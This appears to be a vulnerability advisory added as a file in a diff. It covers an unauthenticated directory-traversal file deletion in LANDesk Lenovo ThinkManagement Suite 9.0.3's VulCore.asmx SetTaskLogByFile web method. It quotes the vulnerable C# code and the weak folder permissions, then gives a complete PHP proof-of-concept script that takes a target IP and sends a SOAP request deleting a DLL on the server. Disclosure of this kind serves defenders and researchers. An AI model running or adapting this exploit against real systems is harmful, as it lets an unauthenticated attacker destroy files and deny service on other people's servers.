@@ -1,0 +1,181 @@
+LANDesk Lenovo ThinkManagement Suite 9.0.3 Core Server WSVulnerabilityCore.dll 
+SetTaskLogByFile() Remote Arbitrary File Deletion Vulnerability
+
+Tested against: Microsoft Windows Server 2003 r2 sp2
+
+Software home page: http://www.landesk.com/lenovo/thinkmanagement-console.aspx
+
+Download url: http://www.landesk.com/downloads/lenovo/50.aspx
+
+Files tested: 
+ThinkManagement9.0.2.exe
+LD90-SP2-MCP_CONS-2011-0428.exe
+LD90-SP2-MCP_SD-2011-0428.exe
+ThinkManagementConsole9.0.3_b28.zip
+
+Instrunctions were to install 9.0.2, then apply two patches, finally to install 9.0.3
+
+Background:
+The mentioned product creates various virtual directories on IIS.
+Among them the 'WSVulnerabilityCore' one.
+Without prior authentication / authorization is possible to 
+invoke the 'VulCore.asmx' web service which exposes various
+functions inside the underlying dlls.
+
+Vulnerability:
+By specifying the 'SetTaskLogByFile' operation is possible to 
+delete arbitrary files on the target operating system.
+
+Vulnerable code:
+
+VulCore.asmx:
+...
+<%@ WebService Language="c#" Codebehind="VulCore.asmx.cs" Class="LANDesk.ManagementSuite.WSVulnerabilityCore.VulCore" %>
+...
+
+SetTaskLogByFile() from the VulCore class of WSVulnerabilityCore.dll:
+...
+[WebMethod]
+public void SetTaskLogByFile(int computerIdn, int taskid, string filename)
+{
+    try
+    {
+        string fullPath = GlobalBiz.LDLogon + @"VulScanResults\" + filename;
+        byte[] fileContents = GlobalBiz.GetFileContents(fullPath);
+        File.Delete(fullPath); //<------------------------ !!!
+        if (filename.EndsWith("z"))
+        {
+            fileContents = GlobalBiz.DecompressBytes(fileContents);
+        }
+        this.SetTaskLog(computerIdn, taskid, Encoding.UTF8.GetString(fileContents));
+    }
+    catch (Exception exception)
+    {
+        RollingLog.Log(exception.ToString(), new object[0]);
+    }
+}
+...
+The 'filename' argument is used to delete files and suffers of a directory traversal vulnerability,
+no checks of any kind.
+
+To the ManagementSuite folder were given unsecure permission, see, from the command line:
+C:\>cacls "C:\Program Files\LANDesk\ManagementSuite\" 
+C:\Program Files\LANDesk\ManagementSuite SERVER\LANDesk Management Suite:R 
+                                         SERVER\LANDesk Management Suite:(OI)(CI)(IO)(special access:)                                                                                      GENERIC_READ
+                                                                                     GENERIC_EXECUTE
+ 
+                                         SERVER\LANDesk Script Writers:R 
+                                         SERVER\LANDesk Script Writers:(OI)(CI)(IO)(special access:)                                                                                    GENERIC_READ
+                                                                                   GENERIC_EXECUTE
+ 
+                                         SERVER\LANDesk Administrators:(OI)(CI)F 
+                                         BUILTIN\Administrators:(OI)(CI)F 
+                                         NT AUTHORITY\SYSTEM:(OI)(CI)F 
+                                         NT AUTHORITY\NETWORK SERVICE:(OI)(CI)F 
+                                         SERVER\ASPNET:(OI)(CI)F  <--------------------------------- !!!
+                                         SERVER\IWAM_SERVER:R 
+                                         SERVER\IWAM_SERVER:(OI)(CI)(IO)(special access:)                                                                         GENERIC_READ
+                                                                        GENERIC_EXECUTE
+ 
+                                         SERVER\IUSR_SERVER:R 
+                                         SERVER\IUSR_SERVER:(OI)(CI)(IO)(special access:)                                                                         GENERIC_READ
+                                                                        GENERIC_EXECUTE
+ 
+                                         NT AUTHORITY\Authenticated Users:R 
+                                         NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(special access:)                                                                                       GENERIC_READ
+                                                                                      GENERIC_EXECUTE
+ 
+ 
+Full privileges were given to the subfolders and files to the ASPNET user.
+So a remote attacker can effectively deny service by deleting dlls, archives and configuration files
+including ex. web.config files.
+Remote code execution could be possible but has not been proofed at the time of this article.
+
+As attachment, a proof of concept code which delete a LANDesk dll from remote.
+
+
+POC:
+<?php
+/*
+LANDesk Lenovo ThinkManagement Suite 9.0.3 Core Server WSVulnerabilityCore.dll 
+SetTaskLogByFile() Remote Arbitrary File Deletion Vulnerability PoC
+*/
+    error_reporting(E_ALL ^ E_NOTICE);     
+    set_time_limit(0);
+    
+	$err[0] = "[!] This script is intended to be launched from the cli!";
+    $err[1] = "[!] You need the curl extesion loaded!";
+
+    if (php_sapi_name() <> "cli") {
+        die($err[0]);
+    }
+    
+	function syntax() {
+       print("usage: php 9sg_landeskii.php [ip_address]\r\n" );
+       die();
+    }
+    
+	$argv[1] ? print("[*] Attacking...\n") :
+    syntax();
+    
+	if (!extension_loaded('curl')) {
+        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true :
+        false;
+        if ($win) {
+            !dl("php_curl.dll") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        } else {
+            !dl("php_curl.so") ? die($err[1]) :
+             print("[*] curl loaded\n");
+        }
+    }
+        
+    function _s($url, $is_post, $ck, $request) {
+        global $_use_proxy, $proxy_host, $proxy_port;
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        if ($is_post) {
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
+        }
+        curl_setopt($ch, CURLOPT_HEADER, 1);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+            "Cookie: ".$ck ,
+            "Content-Type: text/xml; charset=utf-8",
+            "SOAPAction: \"http://tempuri.org/SetTaskLogByFile\""      
+
+        )); 
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, "");
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
+         
+        if ($_use_proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.":".$proxy_port);
+        }
+        $_d = curl_exec($ch);
+        if (curl_errno($ch)) {
+            //die("[!] ".curl_error($ch)."\n");
+        } else {
+            curl_close($ch);
+        }
+        return $_d;
+    }
+          $host = $argv[1];
+          $port = 80;
+
+$soap='<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <SetTaskLogByFile xmlns="http://tempuri.org/">
+      <computerIdn>1</computerIdn>
+      <taskid>1</taskid>
+      <filename>../ygrep32.dll</filename>
+    </SetTaskLogByFile>
+  </soap:Body>
+</soap:Envelope>';
+$url = "http://$host:$port/WSVulnerabilityCore/VulCore.asmx";
+$out = _s($url, 1, "", $soap);
+print($out."\n");
+?>
